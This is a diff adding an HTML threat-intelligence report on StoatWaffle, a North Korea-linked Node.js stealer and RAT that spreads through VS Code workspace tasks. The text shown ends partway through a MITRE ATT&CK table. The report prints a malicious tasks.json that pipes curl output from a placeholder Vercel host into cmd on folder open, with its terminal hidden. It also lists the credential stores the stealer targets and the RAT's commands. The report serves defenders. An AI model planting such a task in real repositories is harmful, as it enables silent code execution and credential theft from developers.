@@ -1,0 +1,729 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>StoatWaffle — When VS Code Becomes a Weapon</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=IBM+Plex+Mono:wght@300;400;600&family=IBM+Plex+Sans:wght@300;400;500&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg0:#0b0e14; --bg1:#10141c; --bg2:#161c26; --bg3:#1c2330; --bg4:#232c3a;
+  --border:#1f2b3e; --border2:#2a3a52;
+  --cyan:#00d4ff; --cyan2:#00a8cc;
+  --red:#e63946; --red2:#c1121f;
+  --orange:#ff6b35; --yellow:#ffd60a;
+  --green:#39d353; --purple:#b47cff;
+  --text0:#e8edf5; --text1:#9aa8be; --text2:#5a6a80; --text3:#374357;
+  --code-bg:#080c12;
+  --font-ui:'Syne',sans-serif;
+  --font-body:'IBM Plex Sans',sans-serif;
+  --font-mono:'IBM Plex Mono',monospace;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:var(--font-body);background:var(--bg0);color:var(--text0);line-height:1.72;overflow-x:hidden}
+body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,0,0,.025) 3px,rgba(0,0,0,.025) 4px);pointer-events:none;z-index:9000}
+a{color:var(--cyan);text-decoration:none}
+a:hover{text-decoration:underline}
+
+/* HERO */
+.hero{position:relative;min-height:94vh;display:flex;flex-direction:column;justify-content:center;padding:90px 48px 70px;border-bottom:1px solid var(--border);overflow:hidden}
+.hero-grid{position:absolute;inset:0;background-image:linear-gradient(rgba(0,212,255,.035) 1px,transparent 1px),linear-gradient(90deg,rgba(0,212,255,.035) 1px,transparent 1px);background-size:56px 56px;mask-image:radial-gradient(ellipse 90% 70% at 55% 40%,black 20%,transparent 80%)}
+.hero-glow-r{position:absolute;width:600px;height:600px;border-radius:50%;background:radial-gradient(circle,rgba(230,57,70,.1) 0%,transparent 65%);top:-160px;right:-80px;pointer-events:none}
+.hero-glow-b{position:absolute;width:480px;height:480px;border-radius:50%;background:radial-gradient(circle,rgba(0,212,255,.07) 0%,transparent 65%);bottom:-120px;left:-60px;pointer-events:none}
+.hero-inner{position:relative;max-width:880px;margin:0 auto;width:100%}
+.hero-date{position:absolute;top:32px;right:48px;font-family:var(--font-mono);font-size:10px;color:var(--text3);letter-spacing:.1em}
+.eyebrow{display:inline-flex;align-items:center;gap:8px;font-family:var(--font-mono);font-size:10px;letter-spacing:.18em;text-transform:uppercase;color:var(--red);background:rgba(230,57,70,.1);border:1px solid rgba(230,57,70,.28);padding:5px 14px;border-radius:2px;margin-bottom:28px}
+.eyebrow-dot{width:6px;height:6px;border-radius:50%;background:var(--red);animation:blink 1.4s infinite}
+.hero-h1{font-family:var(--font-ui);font-size:clamp(2.2rem,5.5vw,3.9rem);font-weight:800;line-height:1.08;margin-bottom:10px;letter-spacing:-.02em}
+.hero-h1 .hl-cyan{color:var(--cyan)}
+.hero-h1 .hl-red{color:var(--red)}
+.hero-sub{font-family:var(--font-mono);font-size:.88rem;color:var(--text1);margin-bottom:36px}
+.badges{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:36px}
+.badge{font-family:var(--font-mono);font-size:10px;letter-spacing:.1em;text-transform:uppercase;padding:4px 12px;border-radius:2px;border:1px solid}
+.badge-red{color:var(--red);border-color:rgba(230,57,70,.35);background:rgba(230,57,70,.08)}
+.badge-cyan{color:var(--cyan);border-color:rgba(0,212,255,.3);background:rgba(0,212,255,.07)}
+.badge-orange{color:var(--orange);border-color:rgba(255,107,53,.35);background:rgba(255,107,53,.08)}
+.badge-yellow{color:var(--yellow);border-color:rgba(255,214,10,.35);background:rgba(255,214,10,.07)}
+.badge-purple{color:var(--purple);border-color:rgba(180,124,255,.35);background:rgba(180,124,255,.08)}
+.badge-green{color:var(--green);border-color:rgba(57,211,83,.3);background:rgba(57,211,83,.07)}
+.stats{display:flex;flex-wrap:wrap;gap:16px;margin-bottom:40px}
+.stat{background:var(--bg2);border:1px solid var(--border);border-radius:4px;padding:14px 20px;min-width:130px}
+.stat-val{font-family:var(--font-ui);font-weight:800;font-size:1.7rem;line-height:1;margin-bottom:4px}
+.stat-lbl{font-family:var(--font-mono);font-size:9px;letter-spacing:.14em;text-transform:uppercase;color:var(--text2)}
+.sv-red{color:var(--red)}.sv-cyan{color:var(--cyan)}.sv-orange{color:var(--orange)}.sv-yellow{color:var(--yellow)}.sv-green{color:var(--green)}
+.tldr{background:rgba(0,212,255,.05);border:1px solid rgba(0,212,255,.18);border-left:3px solid var(--cyan);border-radius:4px;padding:18px 22px;max-width:720px}
+.tldr-lbl{font-family:var(--font-mono);font-size:9px;letter-spacing:.18em;text-transform:uppercase;color:var(--cyan);margin-bottom:8px}
+.tldr p{font-size:.9rem;color:var(--text1);margin:0}
+
+/* LAYOUT */
+.wrap{max-width:1140px;margin:0 auto;display:grid;grid-template-columns:1fr 240px;gap:64px;padding:72px 48px 96px;align-items:start}
+@media(max-width:860px){.wrap{grid-template-columns:1fr}.sidebar{display:none}}
+
+/* SIDEBAR */
+.sidebar{position:sticky;top:32px}
+.toc{background:var(--bg2);border:1px solid var(--border);border-radius:4px;padding:20px;margin-bottom:24px}
+.toc-title{font-family:var(--font-mono);font-size:9px;letter-spacing:.18em;text-transform:uppercase;color:var(--cyan);margin-bottom:14px;padding-bottom:10px;border-bottom:1px solid var(--border)}
+.toc a{display:block;font-family:var(--font-mono);font-size:10px;color:var(--text2);padding:5px 0 5px 12px;border-left:2px solid transparent;transition:all .2s;line-height:1.4;text-decoration:none}
+.toc a:hover{color:var(--cyan);border-left-color:var(--cyan);padding-left:16px}
+.ioc-box{background:var(--bg2);border:1px solid rgba(230,57,70,.25);border-radius:4px;padding:16px}
+.ioc-box-title{font-family:var(--font-mono);font-size:9px;letter-spacing:.18em;text-transform:uppercase;color:var(--red);margin-bottom:12px;padding-bottom:8px;border-bottom:1px solid var(--border)}
+.ioc-ip{font-family:var(--font-mono);font-size:10px;color:var(--text1);padding:4px 0;border-bottom:1px solid var(--border);line-height:1.5}
+.ioc-ip:last-child{border-bottom:none}
+
+/* CONTENT */
+.content{min-width:0}
+.section{margin-bottom:72px}
+.section-header{display:flex;align-items:center;gap:14px;margin-bottom:28px}
+.section-num{font-family:var(--font-mono);font-size:10px;color:var(--cyan);opacity:.55;min-width:28px}
+.section-title{font-family:var(--font-ui);font-weight:700;font-size:1.55rem;letter-spacing:-.01em}
+.section-line{flex:1;height:1px;background:linear-gradient(90deg,var(--border2) 0%,transparent 100%)}
+h3{font-family:var(--font-ui);font-weight:700;font-size:1.05rem;color:var(--cyan);margin:32px 0 12px;display:flex;align-items:center;gap:10px}
+h3::before{content:'//';font-family:var(--font-mono);font-size:11px;color:var(--text3);font-weight:300}
+h4{font-family:var(--font-mono);font-size:.78rem;font-weight:600;color:var(--orange);text-transform:uppercase;letter-spacing:.12em;margin:22px 0 8px}
+p{color:var(--text1);font-size:.93rem;margin-bottom:14px}
+strong{color:var(--text0);font-weight:500}
+
+/* CALLOUTS */
+.callout{border-radius:4px;padding:16px 20px;margin:20px 0;border:1px solid;border-left:3px solid}
+.callout-lbl{font-family:var(--font-mono);font-size:9px;letter-spacing:.16em;text-transform:uppercase;margin-bottom:8px;font-weight:600}
+.callout p{font-size:.88rem;margin:0}
+.callout.bad{background:rgba(230,57,70,.07);border-color:rgba(230,57,70,.25);border-left-color:var(--red)}
+.callout.bad .callout-lbl{color:var(--red)}
+.callout.warn{background:rgba(255,107,53,.07);border-color:rgba(255,107,53,.25);border-left-color:var(--orange)}
+.callout.warn .callout-lbl{color:var(--orange)}
+.callout.info{background:rgba(0,212,255,.05);border-color:rgba(0,212,255,.2);border-left-color:var(--cyan)}
+.callout.info .callout-lbl{color:var(--cyan)}
+.callout.ok{background:rgba(57,211,83,.06);border-color:rgba(57,211,83,.2);border-left-color:var(--green)}
+.callout.ok .callout-lbl{color:var(--green)}
+.callout.purple{background:rgba(180,124,255,.06);border-color:rgba(180,124,255,.2);border-left-color:var(--purple)}
+.callout.purple .callout-lbl{color:var(--purple)}
+
+/* TIMELINE */
+.timeline{margin:32px 0;display:flex;flex-direction:column;gap:0}
+.tl-step{display:grid;grid-template-columns:56px 1fr;gap:20px;position:relative}
+.tl-step:not(:last-child)::before{content:'';position:absolute;left:27px;top:44px;width:2px;height:calc(100% + 4px);background:linear-gradient(180deg,var(--border2) 0%,transparent 100%)}
+.tl-dot-wrap{display:flex;flex-direction:column;align-items:center;padding-top:6px;z-index:1}
+.tl-dot{width:16px;height:16px;border-radius:50%;border:2px solid;flex-shrink:0;background:var(--bg0)}
+.tl-dot.red{border-color:var(--red);box-shadow:0 0 8px rgba(230,57,70,.5)}
+.tl-dot.orange{border-color:var(--orange);box-shadow:0 0 8px rgba(255,107,53,.4)}
+.tl-dot.yellow{border-color:var(--yellow);box-shadow:0 0 8px rgba(255,214,10,.4)}
+.tl-dot.cyan{border-color:var(--cyan);box-shadow:0 0 8px rgba(0,212,255,.4)}
+.tl-dot.green{border-color:var(--green);box-shadow:0 0 8px rgba(57,211,83,.4)}
+.tl-dot.purple{border-color:var(--purple);box-shadow:0 0 8px rgba(180,124,255,.4)}
+.tl-body{background:var(--bg2);border:1px solid var(--border);border-radius:4px;padding:16px 20px;margin-bottom:16px}
+.tl-step-title{font-family:var(--font-ui);font-weight:700;font-size:.92rem;margin-bottom:6px;display:flex;align-items:center;gap:10px}
+.tl-tag{font-family:var(--font-mono);font-size:9px;letter-spacing:.12em;text-transform:uppercase;padding:2px 8px;border-radius:2px;border:1px solid}
+.tl-tag.red{color:var(--red);border-color:rgba(230,57,70,.4);background:rgba(230,57,70,.1)}
+.tl-tag.orange{color:var(--orange);border-color:rgba(255,107,53,.4);background:rgba(255,107,53,.1)}
+.tl-tag.yellow{color:var(--yellow);border-color:rgba(255,214,10,.4);background:rgba(255,214,10,.08)}
+.tl-tag.cyan{color:var(--cyan);border-color:rgba(0,212,255,.35);background:rgba(0,212,255,.08)}
+.tl-tag.green{color:var(--green);border-color:rgba(57,211,83,.35);background:rgba(57,211,83,.08)}
+.tl-tag.purple{color:var(--purple);border-color:rgba(180,124,255,.35);background:rgba(180,124,255,.08)}
+.tl-body p{font-size:.86rem;color:var(--text1);margin:0}
+
+/* CODE */
+.code-block{margin:20px 0}
+.code-label{font-family:var(--font-mono);font-size:9px;letter-spacing:.16em;text-transform:uppercase;color:var(--text2);background:var(--bg3);border:1px solid var(--border);border-bottom:none;display:inline-block;padding:5px 14px;border-radius:2px 2px 0 0}
+.code-label.kql{color:var(--cyan)}
+.code-label.cmd{color:var(--orange)}
+.code-label.json{color:var(--yellow)}
+pre{background:var(--code-bg);border:1px solid var(--border);border-radius:0 4px 4px 4px;padding:20px 22px;overflow-x:auto;font-family:var(--font-mono);font-size:.78rem;line-height:1.65;color:#abb2bf}
+code{font-family:var(--font-mono);font-size:.84em;color:var(--cyan);background:rgba(0,212,255,.08);padding:1px 6px;border-radius:2px}
+pre code{background:none;padding:0;font-size:inherit}
+.kw{color:#c678dd}.fn{color:#61afef}.str{color:#98c379}.cm{color:#5c6370;font-style:italic}.num{color:#d19a66}.op{color:#56b6c2}.var{color:#e06c75}
+
+/* MARKS */
+mark{border-radius:2px;padding:1px 5px;font-family:var(--font-mono);font-size:.82em}
+mark.r{background:rgba(230,57,70,.15);color:var(--red);border:1px solid rgba(230,57,70,.25)}
+mark.y{background:rgba(255,214,10,.1);color:var(--yellow);border:1px solid rgba(255,214,10,.25)}
+mark.o{background:rgba(255,107,53,.12);color:var(--orange);border:1px solid rgba(255,107,53,.25)}
+mark.p{background:rgba(180,124,255,.1);color:var(--purple);border:1px solid rgba(180,124,255,.25)}
+mark.g{background:rgba(57,211,83,.1);color:var(--green);border:1px solid rgba(57,211,83,.25)}
+mark.c{background:rgba(0,212,255,.1);color:var(--cyan);border:1px solid rgba(0,212,255,.25)}
+
+/* ATK/DEF */
+.atkdef{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin:24px 0}
+@media(max-width:640px){.atkdef{grid-template-columns:1fr}}
+.atkdef-panel{background:var(--bg2);border:1px solid var(--border);border-radius:4px;padding:18px 20px}
+.atkdef-panel.atk{border-top:2px solid var(--red)}
+.atkdef-panel.def{border-top:2px solid var(--green)}
+.atkdef-title{font-family:var(--font-mono);font-size:9px;letter-spacing:.18em;text-transform:uppercase;margin-bottom:14px}
+.atkdef-panel.atk .atkdef-title{color:var(--red)}
+.atkdef-panel.def .atkdef-title{color:var(--green)}
+.atkdef-item{display:flex;align-items:flex-start;gap:10px;padding:8px 0;border-bottom:1px solid var(--border);font-size:.84rem}
+.atkdef-item:last-child{border-bottom:none}
+.atkdef-icon{font-size:.7rem;margin-top:3px;flex-shrink:0}
+.atkdef-panel.atk .atkdef-icon{color:var(--red)}
+.atkdef-panel.def .atkdef-icon{color:var(--green)}
+.atkdef-item p{margin:0;color:var(--text1);font-size:.84rem}
+.atkdef-item strong{color:var(--text0);display:block;font-size:.8rem;margin-bottom:2px}
+
+/* PRIORITY GRID */
+.priority-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin:24px 0}
+@media(max-width:700px){.priority-grid{grid-template-columns:1fr 1fr}}
+.prio-card{background:var(--bg2);border:1px solid var(--border);border-radius:4px;padding:16px;position:relative;overflow:hidden}
+.prio-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px}
+.prio-card.p1::before{background:var(--red)}
+.prio-card.p2::before{background:var(--orange)}
+.prio-card.p3::before{background:var(--yellow)}
+.prio-card.p4::before{background:var(--cyan)}
+.prio-num{font-family:var(--font-mono);font-size:10px;letter-spacing:.12em;text-transform:uppercase;margin-bottom:8px}
+.p1 .prio-num{color:var(--red)}.p2 .prio-num{color:var(--orange)}.p3 .prio-num{color:var(--yellow)}.p4 .prio-num{color:var(--cyan)}
+.prio-title{font-family:var(--font-ui);font-weight:700;font-size:.88rem;margin-bottom:6px}
+.prio-card p{font-size:.8rem;color:var(--text2);margin:0}
+
+/* TABLES */
+.check-table,.mitre-table{width:100%;border-collapse:collapse;margin:16px 0 24px}
+.check-table th,.mitre-table th{background:var(--bg3);border:1px solid var(--border);font-family:var(--font-mono);font-size:9px;letter-spacing:.14em;text-transform:uppercase;color:var(--text2);padding:10px 14px;text-align:left}
+.check-table td,.mitre-table td{background:var(--bg2);border:1px solid var(--border);font-size:.83rem;padding:10px 14px;color:var(--text1);vertical-align:top}
+.check-table tr:hover td,.mitre-table tr:hover td{background:var(--bg3)}
+.mitre-id{font-family:var(--font-mono);font-size:.78rem;color:var(--purple)}
+.sev{font-family:var(--font-mono);font-size:9px;letter-spacing:.1em;text-transform:uppercase;padding:3px 8px;border-radius:2px;border:1px solid}
+.sev.critical{color:var(--red);border-color:rgba(230,57,70,.4);background:rgba(230,57,70,.1)}
+.sev.high{color:var(--orange);border-color:rgba(255,107,53,.4);background:rgba(255,107,53,.1)}
+.sev.medium{color:var(--yellow);border-color:rgba(255,214,10,.4);background:rgba(255,214,10,.08)}
+.sev.info{color:var(--cyan);border-color:rgba(0,212,255,.35);background:rgba(0,212,255,.08)}
+
+.sep{border:none;height:1px;background:linear-gradient(90deg,transparent,var(--border2),transparent);margin:48px 0}
+
+/* FOOTER */
+footer{border-top:1px solid var(--border);padding:40px 48px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:16px;background:var(--bg1)}
+.footer-l{font-family:var(--font-mono);font-size:.78rem;color:var(--text2)}
+.footer-sources{font-family:var(--font-mono);font-size:10px;color:var(--text3);text-align:right}
+.footer-sources a{color:var(--text2)}
+
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
+</style>
+</head>
+<body>
+
+<!-- HERO -->
+<section class="hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow-r"></div>
+  <div class="hero-glow-b"></div>
+  <span class="hero-date">March 2026 · Threat Intelligence</span>
+  <div class="hero-inner">
+    <div class="eyebrow"><span class="eyebrow-dot"></span>Active Threat · WaterPlum · North Korea-linked</div>
+    <h1 class="hero-h1">StoatWaffle —<br>When <span class="hl-cyan">VS Code</span><br>Becomes a <span class="hl-red">Weapon</span></h1>
+    <p class="hero-sub">Anatomy of a zero-click developer compromise · NTT Security Japan · March 2026</p>
+    <div class="badges">
+      <span class="badge badge-red">WaterPlum / DPRK</span>
+      <span class="badge badge-cyan">Contagious Interview</span>
+      <span class="badge badge-orange">VS Code Abuse</span>
+      <span class="badge badge-yellow">Supply Chain</span>
+      <span class="badge badge-purple">Node.js RAT</span>
+      <span class="badge badge-green">Stealer + C2</span>
+    </div>
+    <div class="stats">
+      <div class="stat"><div class="stat-val sv-red">0</div><div class="stat-lbl">Clicks required</div></div>
+      <div class="stat"><div class="stat-val sv-orange">5s</div><div class="stat-lbl">C2 polling interval</div></div>
+      <div class="stat"><div class="stat-val sv-cyan">531+</div><div class="stat-lbl">Malicious npm pkgs</div></div>
+      <div class="stat"><div class="stat-val sv-yellow">80K+</div><div class="stat-lbl">Total downloads</div></div>
+      <div class="stat"><div class="stat-val sv-green">131</div><div class="stat-lbl">GitLab accts banned</div></div>
+    </div>
+    <div class="tldr">
+      <div class="tldr-lbl">TL;DR</div>
+      <p>StoatWaffle is a modular Node.js malware (Stealer + RAT) deployed by WaterPlum Team 8 — a North Korean threat actor. It weaponizes a native VS Code feature (<mark class="c">.vscode/tasks.json</mark> with <mark class="c">runOn: folderOpen</mark>) to achieve zero-click compromise the instant a developer opens a malicious blockchain-themed repository. This is a decisive evolution of the Contagious Interview campaign, active since 2022.</p>
+    </div>
+  </div>
+</section>
+
+<!-- MAIN -->
+<div class="wrap">
+
+<!-- SIDEBAR -->
+<aside class="sidebar">
+  <div class="toc">
+    <div class="toc-title">Contents</div>
+    <a href="#s1">01 · Campaign Background</a>
+    <a href="#s2">02 · Attack Flow</a>
+    <a href="#s3">03 · Stealer Module</a>
+    <a href="#s4">04 · RAT Module</a>
+    <a href="#s5">05 · MITRE ATT&amp;CK</a>
+    <a href="#s6">06 · Sentinel Detections</a>
+    <a href="#s7">07 · Atk vs. Def</a>
+    <a href="#s8">08 · Hardening Checklist</a>
+    <a href="#s9">09 · Conclusion</a>
+  </div>
+  <div class="ioc-box">
+    <div class="ioc-box-title">&#9888; C2 IOCs (defanged)</div>
+    <div class="ioc-ip">185[.]163.125.196</div>
+    <div class="ioc-ip">147[.]124.202.208</div>
+    <div class="ioc-ip">163[.]245.194.216</div>
+    <div class="ioc-ip">66[.]235.168.136</div>
+    <div class="ioc-ip">87[.]236.177.9</div>
+  </div>
+</aside>
+
+<!-- CONTENT -->
+<main class="content">
+
+<!-- §1 -->
+<section class="section" id="s1">
+  <div class="section-header">
+    <span class="section-num">01</span>
+    <h2 class="section-title">Contagious Interview — The Industrial Campaign</h2>
+    <div class="section-line"></div>
+  </div>
+  <p>Since at least 2022, <strong>WaterPlum</strong> (also tracked as DeceptiveDevelopment, DEV#POPPER, TAG-121, PurpleBravo) has operated the most prolific developer-targeting campaign ever documented. Their playbook is precise: fake recruiter profiles, bogus coding assignments, malicious packages — and now, weaponized IDE configurations.</p>
+  <div class="callout bad">
+    <div class="callout-lbl">&#9888; Critical Context</div>
+    <p>The FBI seized the <strong>BlockNovas</strong> front company domain (April 2025) — a fake tech firm with AI-generated employee profiles used to deliver malicious coding tests. WaterPlum immediately rebuilt equivalent infrastructure and continued operations without interruption.</p>
+  </div>
+  <h3>Infrastructure Evolution (2022 → 2026)</h3>
+  <div class="timeline">
+    <div class="tl-step">
+      <div class="tl-dot-wrap"><div class="tl-dot cyan"></div></div>
+      <div class="tl-body">
+        <div class="tl-step-title">2022–2023 <span class="tl-tag cyan">Genesis</span></div>
+        <p>Fake recruiter profiles on LinkedIn and job boards. Developers invited to "technical interviews" and asked to clone/run projects containing <mark class="c">BeaverTail</mark> infostealer and <mark class="c">InvisibleFerret</mark> backdoor.</p>
+      </div>
+    </div>
+    <div class="tl-step">
+      <div class="tl-dot-wrap"><div class="tl-dot orange"></div></div>
+      <div class="tl-body">
+        <div class="tl-step-title">2024 <span class="tl-tag orange">npm at scale</span></div>
+        <p>Industrial npm poisoning. <mark class="c">OtterCookie</mark> introduced — merges BeaverTail with a remote shell. GitLab bans 131 accounts. 338+ malicious packages deployed in a single wave. Vercel used as staging layer.</p>
+      </div>
+    </div>
+    <div class="tl-step">
+      <div class="tl-dot-wrap"><div class="tl-dot yellow"></div></div>
+      <div class="tl-body">
+        <div class="tl-step-title">Late 2024 <span class="tl-tag yellow">Anti-Analysis</span></div>
+        <p>Payload staging split across GitHub + Vercel + C2. Anti-sandbox detection in OtterCookie. Invite-only private repos. Staging URLs return decoy content unless correct HTTP headers are supplied — defeating automated scanners.</p>
+      </div>
+    </div>
+    <div class="tl-step">
+      <div class="tl-dot-wrap"><div class="tl-dot red"></div></div>
+      <div class="tl-body">
+        <div class="tl-step-title">Dec 2025 → 2026 <span class="tl-tag red">StoatWaffle</span></div>
+        <p>Team 8 abandons OtterCookie for <strong>StoatWaffle</strong>. Zero-click compromise via VS Code workspace tasks. Node.js Stealer + RAT deployed within minutes. WSL-aware. Keychain-targeting on macOS. IDE is now the entry point.</p>
+      </div>
+    </div>
+  </div>
+  <div class="callout info">
+    <div class="callout-lbl">ℹ Attribution</div>
+    <p>ESET Research documented direct code links between DeceptiveDevelopment's <strong>Tropidoor</strong> backdoor and the <strong>PostNapTea RAT</strong> used by the Lazarus group, confirming WaterPlum's integration into North Korea's broader cyber offensive apparatus. MITRE tracks this as <strong>G1052</strong>.</p>
+  </div>
+</section>
+
+<hr class="sep">
+
+<!-- §2 -->
+<section class="section" id="s2">
+  <div class="section-header">
+    <span class="section-num">02</span>
+    <h2 class="section-title">Attack Flow — Zero-Click Compromise</h2>
+    <div class="section-line"></div>
+  </div>
+  <p>StoatWaffle's key innovation is eliminating the final friction point of all prior Contagious Interview variants: manual script execution. The entire kill chain fires from a single developer action — opening a folder.</p>
+  <div class="callout warn">
+    <div class="callout-lbl">&#9889; Key Innovation</div>
+    <p>VS Code's native <code>tasks.json</code> with <mark class="o">runOn: folderOpen</mark> fires automatically when a workspace is opened and marked as trusted. No click, no install, no warning after the initial trust prompt — which most developers dismiss reflexively.</p>
+  </div>
+  <div class="timeline">
+    <div class="tl-step">
+      <div class="tl-dot-wrap"><div class="tl-dot cyan"></div></div>
+      <div class="tl-body">
+        <div class="tl-step-title">Step 1 — Lure Delivery <span class="tl-tag cyan">Social Engineering</span></div>
+        <p>Developer receives a blockchain/Web3 repository via LinkedIn, job board, or direct message — framed as a "coding test" or "open source contribution". Repository has a realistic README, proper commit history, and plausible project structure.</p>
+      </div>
+    </div>
+    <div class="tl-step">
+      <div class="tl-dot-wrap"><div class="tl-dot orange"></div></div>
+      <div class="tl-body">
+        <div class="tl-step-title">Step 2 — Folder Trust <span class="tl-tag orange">VS Code Abuse</span></div>
+        <p>Developer opens the folder in VS Code and clicks "Yes, I trust the authors". The <mark class="o">.vscode/tasks.json</mark> task fires immediately, downloading an initial payload from a <strong>Vercel-hosted endpoint</strong> via <code>cmd.exe</code>. Terminal: hidden (<mark class="o">reveal: "never"</mark>).</p>
+      </div>
+    </div>
+    <div class="tl-step">
+      <div class="tl-dot-wrap"><div class="tl-dot yellow"></div></div>
+      <div class="tl-body">
+        <div class="tl-step-title">Step 3 — Bootstrap <span class="tl-tag yellow">Environment Prep</span></div>
+        <p><mark class="y">vscode-bootstrap.cmd</mark> checks for Node.js. If absent, downloads and installs it from the official site (bypassing LOLBin heuristics). Downloads <mark class="y">env.npl</mark> + <mark class="y">package.json</mark>, executes <mark class="y">env.npl</mark> via Node.js.</p>
+      </div>
+    </div>
+    <div class="tl-step">
+      <div class="tl-dot-wrap"><div class="tl-dot red"></div></div>
+      <div class="tl-body">
+        <div class="tl-step-title">Step 4 — C2 Polling <span class="tl-tag red">Staged C2</span></div>
+        <p><mark class="r">env.npl</mark> polls <mark class="r">/api/errorMessage</mark> every <strong>5 seconds</strong>. Error-status responses are executed as live Node.js code. ~5 min later: second downloader delivered, polling <mark class="r">/api/handleErrors</mark>.</p>
+      </div>
+    </div>
+    <div class="tl-step">
+      <div class="tl-dot-wrap"><div class="tl-dot purple"></div></div>
+      <div class="tl-body">
+        <div class="tl-step-title">Step 5 — Module Deployment <span class="tl-tag purple">Full Compromise</span></div>
+        <p>Both <strong>Stealer</strong> and <strong>RAT</strong> modules deployed simultaneously. Credential harvesting begins. Persistent C2 shell established. The attacker has complete interactive access to the developer workstation and all secrets it holds.</p>
+      </div>
+    </div>
+  </div>
+  <h3>Malicious tasks.json</h3>
+  <div class="code-block">
+    <div class="code-label json">JSON · .vscode/tasks.json</div>
+    <pre><span class="cm">// Embedded in the malicious blockchain repository</span>
+{
+  <span class="str">"version"</span>: <span class="str">"2.0.0"</span>,
+  <span class="str">"tasks"</span>: [{
+    <span class="str">"label"</span>: <span class="str">"setup-env"</span>,
+    <span class="str">"type"</span>: <span class="str">"shell"</span>,
+    <span class="str">"command"</span>: <span class="str">"cmd /c curl -s https://[app].vercel.app/init | cmd"</span>,
+    <span class="str">"runOptions"</span>: {
+      <span class="str">"runOn"</span>: <span class="str">"folderOpen"</span>    <span class="cm">// &lt;-- ZERO-CLICK TRIGGER</span>
+    },
+    <span class="str">"presentation"</span>: {
+      <span class="str">"reveal"</span>: <span class="str">"never"</span>,      <span class="cm">// Execution invisible to developer</span>
+      <span class="str">"panel"</span>: <span class="str">"dedicated"</span>
+    }
+  }]
+}</pre>
+  </div>
+</section>
+
+<hr class="sep">
+
+<!-- §3 -->
+<section class="section" id="s3">
+  <div class="section-header">
+    <span class="section-num">03</span>
+    <h2 class="section-title">Stealer Module — Targeted Credential Harvesting</h2>
+    <div class="section-line"></div>
+  </div>
+  <p>The Stealer adapts its behavior to the victim's OS and browser. Files are copied under a random name to a temporary directory, then exfiltrated to <mark class="c">/upload</mark> on the C2. A software inventory goes separately to <mark class="c">/uploadsecond</mark>.</p>
+  <h4>&#9658; Chromium (Chrome, Edge, Brave, Opera)</h4>
+  <p>Harvests <mark class="c">Login Data</mark> (SQLite credential store) AND <mark class="c">Local Extension Settings</mark> — directly targeting crypto wallet extensions: MetaMask, Phantom, Coinbase Wallet, Exodus, etc.</p>
+  <h4>&#9658; Firefox</h4>
+  <p>Reads <mark class="c">extensions.json</mark> to enumerate installed extensions, checks for designated wallet keywords. Harvests <mark class="c">key4.db</mark> and <mark class="c">logins.json</mark> for all stored credentials.</p>
+  <h4>&#9658; macOS — Keychain</h4>
+  <p>Additionally exfiltrates <mark class="c">login.keychain-db</mark> — Apple's native credential store containing Wi-Fi passwords, application tokens, certificates, and SSH keys.</p>
+  <div class="callout purple">
+    <div class="callout-lbl">&#128300; Advanced: WSL Boundary Crossing</div>
+    <p>The Stealer detects WSL execution contexts. If running inside WSL, it retrieves the Windows user profile path and converts it via <mark class="p">wslpath</mark>, allowing Node.js on WSL to access and exfiltrate Windows filesystem data. A cross-boundary pivot rarely seen in commodity malware — demonstrating deep familiarity with developer environments.</p>
+  </div>
+</section>
+
+<hr class="sep">
+
+<!-- §4 -->
+<section class="section" id="s4">
+  <div class="section-header">
+    <span class="section-num">04</span>
+    <h2 class="section-title">RAT Module — Persistent Interactive Control</h2>
+    <div class="section-line"></div>
+  </div>
+  <p>The RAT polls <mark class="c">/api/hsocketNext</mark> for commands, returns results to <mark class="c">/api/hsocketResult</mark>. Entirely Node.js — no compiled binary, cross-platform, minimal disk footprint.</p>
+  <table class="check-table">
+    <thead><tr><th>Command</th><th>Action</th><th>Severity</th></tr></thead>
+    <tbody>
+      <tr><td><code>exit</code></td><td>Terminate RAT process</td><td><span class="sev medium">Medium</span></td></tr>
+      <tr><td><code>cd [dir]</code></td><td>Change working directory</td><td><span class="sev medium">Medium</span></td></tr>
+      <tr><td><code>ls / dir</code></td><td>List files and directories</td><td><span class="sev medium">Medium</span></td></tr>
+      <tr><td><code>get [file]</code></td><td>Download arbitrary file to C2</td><td><span class="sev high">High</span></td></tr>
+      <tr><td><code>eval [code]</code></td><td>Execute arbitrary Node.js code in-process</td><td><span class="sev critical">Critical</span></td></tr>
+      <tr><td><code>shell [cmd]</code></td><td>Execute arbitrary shell command</td><td><span class="sev critical">Critical</span></td></tr>
+      <tr><td><code>app</code></td><td>Navigate to application directory</td><td><span class="sev info">Info</span></td></tr>
+      <tr><td><code>detail</code></td><td>Retrieve detailed directory info</td><td><span class="sev medium">Medium</span></td></tr>
+    </tbody>
+  </table>
+  <div class="callout bad">
+    <div class="callout-lbl">&#128308; Highest Risk: eval</div>
+    <p>The <mark class="r">eval</mark> command executes Node.js <strong>in-process</strong> — no child process spawn, no EDR spawn event, no process tree anomaly. Combined with <mark class="r">shell</mark>, the attacker has full OS execution while remaining largely invisible to traditional process-based detection.</p>
+  </div>
+</section>
+
+<hr class="sep">
+
+<!-- §5 -->
+<section class="section" id="s5">
+  <div class="section-header">
+    <span class="section-num">05</span>
+    <h2 class="section-title">MITRE ATT&amp;CK Coverage</h2>
+    <div class="section-line"></div>
+  </div>
+  <table class="mitre-table">
+    <thead><tr><th>ID</th><th>Technique</th><th>Implementation</th><th>Severity</th></tr></thead>
+    <tbody>
+      <tr><td><span class="mitre-id">T1204.002</span></td><td>User Execution: Malicious File</td><td>Open malicious VS Code workspace</td><td><span class="sev critical">Critical</span></td></tr>
+      <tr><td><span class="mitre-id">T1059.007</span></td><td>JavaScript Interpreter</td><td>Node.js runtime for all stages</td><td><span class="sev critical">Critical</span></td></tr>
